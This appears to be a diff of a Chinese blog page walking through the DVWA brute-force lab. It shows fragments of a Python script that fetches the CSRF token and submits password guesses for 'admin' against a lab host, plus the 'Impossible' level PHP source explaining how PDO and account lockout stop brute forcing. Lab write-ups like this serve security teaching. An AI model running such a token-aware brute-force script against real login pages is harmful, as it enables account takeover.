@@ -432,7 +432,7 @@ session.headers = &#123;
 
 
 def getToken():  # 获取 CSRF Token
-    url = &quot;http://dvwa.zeroy.net/vulnerabilities/brute/&quot;
+    url = &quot;http://172.19.11.99:10000/vulnerabilities/brute/&quot;
     response = session.get(url)
     bs = bs4.BeautifulSoup(response.text, &quot;html.parser&quot;)
     user_token = bs.find(&quot;input&quot;, attrs=&#123;&#39;name&#39;: &#39;user_token&#39;&#125;).get(&quot;value&quot;)
@@ -440,7 +440,7 @@ def getToken():  # 获取 CSRF Token
 
 
 def sendRequest(pwd, user_token):
-    url = f&quot;http://dvwa.zeroy.net/vulnerabilities/brute/?username=admin&amp;password=&#123;pwd&#125;&amp;Login=Login&amp;user_token=&#123;user_token&#125;&quot;
+    url = f&quot;http://172.19.11.99:10000/vulnerabilities/brute/?username=admin&amp;password=&#123;pwd&#125;&amp;Login=Login&amp;user_token=&#123;user_token&#125;&quot;
     response = session.get(url)  # 使用requests发送get请求
     print(f&quot;&#123;pwd&#125;: &#123;len(response.content)&#125;&quot;)  # 输出响应长度
 
@@ -452,6 +452,116 @@ if __name__ == &#39;__main__&#39;:
         sendRequest(password, utoken)
 </code></pre>
 <h3 id="爆破结果"><a href="#爆破结果" class="headerlink" title="爆破结果"></a>爆破结果</h3><p><img src="./bp6.png" alt="爆破结果"></p>
+<h2 id="Impossible"><a href="#Impossible" class="headerlink" title="Impossible"></a>Impossible</h2><h3 id="源码分析-3"><a href="#源码分析-3" class="headerlink" title="源码分析"></a>源码分析</h3><pre><code class="php">&lt;?php
+
+if( isset( $_POST[ &#39;Login&#39; ] ) &amp;&amp; isset ($_POST[&#39;username&#39;]) &amp;&amp; isset ($_POST[&#39;password&#39;]) ) &#123;
+    // Check Anti-CSRF token
+    checkToken( $_REQUEST[ &#39;user_token&#39; ], $_SESSION[ &#39;session_token&#39; ], &#39;index.php&#39; );
+
+    // Sanitise username input
+    $user = $_POST[ &#39;username&#39; ];
+    $user = stripslashes( $user );
+    $user = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $user ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
+
+    // Sanitise password input
+    $pass = $_POST[ &#39;password&#39; ];
+    $pass = stripslashes( $pass );
+    $pass = ((isset($GLOBALS[&quot;___mysqli_ston&quot;]) &amp;&amp; is_object($GLOBALS[&quot;___mysqli_ston&quot;])) ? mysqli_real_escape_string($GLOBALS[&quot;___mysqli_ston&quot;],  $pass ) : ((trigger_error(&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;, E_USER_ERROR)) ? &quot;&quot; : &quot;&quot;));
+    $pass = md5( $pass );
+
+    // Default values
+    $total_failed_login = 3;
+    $lockout_time       = 15;
+    $account_locked     = false;
+
+    // Check the database (Check user information)
+    $data = $db-&gt;prepare( &#39;SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;&#39; );
+    $data-&gt;bindParam( &#39;:user&#39;, $user, PDO::PARAM_STR );
+    $data-&gt;execute();
+    $row = $data-&gt;fetch();
+
+    // Check to see if the user has been locked out.
+    if( ( $data-&gt;rowCount() == 1 ) &amp;&amp; ( $row[ &#39;failed_login&#39; ] &gt;= $total_failed_login ) )  &#123;
+        // User locked out.  Note, using this method would allow for user enumeration!
+        //echo &quot;&lt;pre&gt;&lt;br /&gt;This account has been locked due to too many incorrect logins.&lt;/pre&gt;&quot;;
+
+        // Calculate when the user would be allowed to login again
+        $last_login = strtotime( $row[ &#39;last_login&#39; ] );
+        $timeout    = $last_login + ($lockout_time * 60);
+        $timenow    = time();
+
+        /*
+        print &quot;The last login was: &quot; . date (&quot;h:i:s&quot;, $last_login) . &quot;&lt;br /&gt;&quot;;
+        print &quot;The timenow is: &quot; . date (&quot;h:i:s&quot;, $timenow) . &quot;&lt;br /&gt;&quot;;
+        print &quot;The timeout is: &quot; . date (&quot;h:i:s&quot;, $timeout) . &quot;&lt;br /&gt;&quot;;
+        */
+
+        // Check to see if enough time has passed, if it hasn&#39;t locked the account
+        if( $timenow &lt; $timeout ) &#123;
+            $account_locked = true;
+            // print &quot;The account is locked&lt;br /&gt;&quot;;
+        &#125;
+    &#125;
+
+    // Check the database (if username matches the password)
+    $data = $db-&gt;prepare( &#39;SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;&#39; );
+    $data-&gt;bindParam( &#39;:user&#39;, $user, PDO::PARAM_STR);
+    $data-&gt;bindParam( &#39;:password&#39;, $pass, PDO::PARAM_STR );
+    $data-&gt;execute();
+    $row = $data-&gt;fetch();
+
+    // If its a valid login...
+    if( ( $data-&gt;rowCount() == 1 ) &amp;&amp; ( $account_locked == false ) ) &#123;
+        // Get users details
+        $avatar       = $row[ &#39;avatar&#39; ];
+        $failed_login = $row[ &#39;failed_login&#39; ];
+        $last_login   = $row[ &#39;last_login&#39; ];
+
+        // Login successful
+        echo &quot;&lt;p&gt;Welcome to the password protected area &lt;em&gt;&#123;$user&#125;&lt;/em&gt;&lt;/p&gt;&quot;;
+        echo &quot;&lt;img src=\&quot;&#123;$avatar&#125;\&quot; /&gt;&quot;;
+
+        // Had the account been locked out since last login?
+        if( $failed_login &gt;= $total_failed_login ) &#123;
+            echo &quot;&lt;p&gt;&lt;em&gt;Warning&lt;/em&gt;: Someone might of been brute forcing your account.&lt;/p&gt;&quot;;
+            echo &quot;&lt;p&gt;Number of login attempts: &lt;em&gt;&#123;$failed_login&#125;&lt;/em&gt;.&lt;br /&gt;Last login attempt was at: &lt;em&gt;$&#123;last_login&#125;&lt;/em&gt;.&lt;/p&gt;&quot;;
+        &#125;
+
+        // Reset bad login count
+        $data = $db-&gt;prepare( &#39;UPDATE users SET failed_login = &quot;0&quot; WHERE user = (:user) LIMIT 1;&#39; );
+        $data-&gt;bindParam( &#39;:user&#39;, $user, PDO::PARAM_STR );
+        $data-&gt;execute();
+    &#125; else &#123;
+        // Login failed
+        sleep( rand( 2, 4 ) );
+
+        // Give the user some feedback
+        echo &quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;br /&gt;&lt;br/&gt;Alternative, the account has been locked because of too many failed logins.&lt;br /&gt;If this is the case, &lt;em&gt;please try again in &#123;$lockout_time&#125; minutes&lt;/em&gt;.&lt;/pre&gt;&quot;;
+
+        // Update bad login count
+        $data = $db-&gt;prepare( &#39;UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;&#39; );
+        $data-&gt;bindParam( &#39;:user&#39;, $user, PDO::PARAM_STR );
+        $data-&gt;execute();
+    &#125;
+
+    // Set the last login time
+    $data = $db-&gt;prepare( &#39;UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;&#39; );
+    $data-&gt;bindParam( &#39;:user&#39;, $user, PDO::PARAM_STR );
+    $data-&gt;execute();
+&#125;
+
+// Generate Anti-CSRF token
+generateSessionToken();
+
+?&gt;
+</code></pre>
+<p>Impossible级别增加了</p>
+<ul>
+<li>PDO</li>
+<li>密码尝试次数上限</li>
+<li>超过上限锁定账户</li>
+</ul>
+<p>密码错误超过三次后将会锁定15分钟，能够有效防止暴力破解<br>采用PDO拓展能够有效的防止sql注入</p>
 
                 </div>
                 <!-- .entry-content -->
